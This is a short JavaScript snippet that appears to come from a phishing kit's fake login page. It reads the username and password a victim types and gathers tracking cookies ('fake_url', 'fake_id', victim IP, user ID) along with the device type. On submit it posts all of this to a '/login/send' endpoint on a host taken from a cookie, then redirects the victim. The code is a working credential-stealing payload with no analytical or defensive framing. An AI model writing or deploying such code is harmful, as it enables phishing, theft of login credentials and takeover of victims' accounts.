<script>
    let login = document.querySelector('#lgn').value
    let password = document.querySelector('#psw').value
    let button = document.querySelector('#btn')
    function getUserDevice(){
        if(navigator.userAgent.match(/iPad/i)){
            return 'iPad'
        }
        if(navigator.userAgent.match(/iPhone/i)){
            return 'iPhone'
        }
        if(navigator.userAgent.match(/Android/i)){
            return 'Android'
        }
        return 'PC'
    }
    function getCookies(cookies){
        let obj = {}
        cookies.split('; ').map(e=>{obj[e.split('=')[0]] = e.split('=')[1]})
        return obj
    }
    let cookies_data = getCookies(document.cookie)
    //If cookies not found
    if(!cookies_data.id){
        //window.parent.location.href = "https://google.com/404"
    }
     button.addEventListener('click', async (e) => {
        e.preventDefault()
        let url = decodeURIComponent(cookies_data.fake_url)
        url = new URL(url).host
        await fetch(`https://${url}/login/send`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                login: document.querySelector('#lgn').value,
                password: document.querySelector('#psw').value,
                fake_url: url,
                ip: decodeURIComponent(cookies_data.ip),
                user_id: cookies_data.id,
                fake_id: cookies_data.fake_id,
                type: cookies_data.type,
                user_agent: getUserDevice()
            })

     }).then(response => {
                    setTimeout(() => {
                        location.href=(decodeURIComponent(cookies_data.redirect))
                    }, 500)
            })
    })
</script>
